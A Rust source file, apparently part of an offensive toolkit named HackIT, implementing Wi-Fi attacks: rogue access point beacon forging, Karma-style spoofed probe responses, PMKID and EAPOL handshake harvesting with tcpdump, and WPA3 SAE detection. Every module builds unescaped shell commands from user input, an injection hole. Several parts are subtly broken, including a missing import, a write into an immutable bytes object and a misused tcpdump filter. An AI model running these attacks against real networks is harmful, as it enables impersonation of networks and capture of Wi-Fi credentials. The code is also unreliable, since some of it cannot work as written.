use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};

pub struct RogueAp {
    pub iface: String,
    pub ssid: String,
    pub channel: u8,
    pub bssid: String,
    pub captive_portal: bool,
}

pub struct KarmaAttack {
    pub iface: String,
    pub probe_ssid: String,
    pub response_ssid: String,
    pub count: u32,
}

pub struct PmkidAttack {
    pub iface: String,
    pub bssid: Option<String>,
    pub timeout: u64,
    pub output: Option<String>,
}

pub struct Wpa3Attack {
    pub iface: String,
    pub bssid: Option<String>,
    pub sae_pwd: Option<String>,
    pub timeout: u64,
}

impl RogueAp {
    pub fn new(iface: &str, ssid: &str) -> Self {
        Self {
            iface: iface.to_string(),
            ssid: ssid.to_string(),
            channel: 6,
            bssid: String::new(),
            captive_portal: false,
        }
    }

    pub fn start(&self) -> Result<String, String> {
        let bssid = if self.bssid.is_empty() {
            format!("02:00:00:00:00:{:02x}", (SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos() & 0xFF) as u8)
        } else {
            self.bssid.clone()
        };
        let cmd = format!(
            "iw dev {} set channel {} && python3 -c \"
import socket, struct, time, random
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
s.bind(('{}', 0))
bssid = bytes.fromhex('{}')
ssid = '{}'
while True:
    frame = bytes.fromhex('80000000ffffffffffff') + bssid * 2 + bytes.fromhex('0000')
    frame += struct.pack('<Q', int(time.time())) + struct.pack('<H', 100) + struct.pack('<H', 0x0431)
    frame += bytes([0, len(ssid)]) + ssid.encode() + bytes([1,8]) + bytes([0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24])
    frame += bytes([3,1,{}])
    try: s.send(frame)
    except: pass
    time.sleep(0.1)
\"",
            self.iface, self.channel,
            self.iface,
            bssid.replace(":", ""),
            self.ssid,
            self.channel
        );
        let output = Command::new("sh")
            .arg("-c")
            .arg(&cmd)
            .output()
            .map_err(|e| format!("RogueAP failed: {}", e))?;
        if output.status.success() {
            Ok(format!("RogueAP '{}' on {} ch{}", self.ssid, self.iface, self.channel))
        } else {
            Err(String::from_utf8_lossy(&output.stderr).to_string())
        }
    }

    pub fn with_channel(mut self, ch: u8) -> Self {
        self.channel = ch;
        self
    }

    pub fn with_captive_portal(mut self, enable: bool) -> Self {
        self.captive_portal = enable;
        self
    }
}

impl KarmaAttack {
    pub fn new(iface: &str) -> Self {
        Self {
            iface: iface.to_string(),
            probe_ssid: String::new(),
            response_ssid: String::new(),
            count: 100,
        }
    }

    pub fn execute(&self) -> Result<String, String> {
        let ssid = if self.response_ssid.is_empty() {
            "HackIT-Free-WiFi"
        } else {
            &self.response_ssid
        };
        let cmd = format!(
            "python3 -c \"
import socket, struct, time
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
s.bind(('{}', 0))
ssid = '{}'
for i in range({}):
    mac = bytes([random.randint(0,255) for _ in range(6)])
    mac[0] = (mac[0] & 0xFE) | 0x02
    frame = bytes.fromhex('50000000ffffffffffff') + mac + mac + struct.pack('<H', (i&0xFFF)<<4)
    frame += bytes([0, len(ssid)]) + ssid.encode()
    frame += bytes([1,8]) + bytes([0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24])
    try: s.send(frame)
    except: pass
    time.sleep(0.01)
\" 2>/dev/null",
            self.iface, ssid, self.count
        );
        let _ = Command::new("sh").arg("-c").arg(&cmd).output();
        Ok(format!("Karma sent {} probe responses", self.count))
    }
}

impl PmkidAttack {
    pub fn new(iface: &str) -> Self {
        Self {
            iface: iface.to_string(),
            bssid: None,
            timeout: 60,
            output: None,
        }
    }

    pub fn harvest(&self) -> Result<Vec<String>, String> {
        let timeout = self.timeout;
        let cmd = format!(
            "timeout {} tcpdump -i {} -n -X -c 500 'ether proto 0x888e or (type mgt subtype assoc)' 2>/dev/null | grep -i 'pmkid\\|PTK\\|04:0c\\|3026' || true",
            timeout, self.iface
        );
        let output = Command::new("sh")
            .arg("-c")
            .arg(&cmd)
            .output()
            .map_err(|e| format!("PMKID harvest failed: {}", e))?;
        let lines: Vec<String> = String::from_utf8_lossy(&output.stdout)
            .lines()
            .map(|l| l.to_string())
            .collect();
        Ok(lines)
    }
}

impl Wpa3Attack {
    pub fn new(iface: &str) -> Self {
        Self {
            iface: iface.to_string(),
            bssid: None,
            sae_pwd: None,
            timeout: 120,
        }
    }

    pub fn detect_sae(&self) -> Result<Vec<String>, String> {
        let bssid_filter = self.bssid.as_ref().map_or(String::new(), |b| format!(" and wlan.addr=={}", b));
        let cmd = format!(
            "timeout {to} tcpdump -i {iface} -n -c 200 'type mgt subtype beacon{bssid}' 2>/dev/null | tshark -r - -Y 'wlan.rsn.akm.type == 8' -T fields -e wlan.sa -e wlan.rsn.akm.type 2>/dev/null | sort -u || true",
            to = self.timeout, iface = self.iface, bssid = bssid_filter
        );
        let output = Command::new("sh")
            .arg("-c")
            .arg(&cmd)
            .output()
            .map_err(|e| format!("WPA3 detection failed: {}", e))?;
        let results: Vec<String> = String::from_utf8_lossy(&output.stdout)
            .lines()
            .map(|l| l.to_string())
            .collect();
        Ok(results)
    }
}
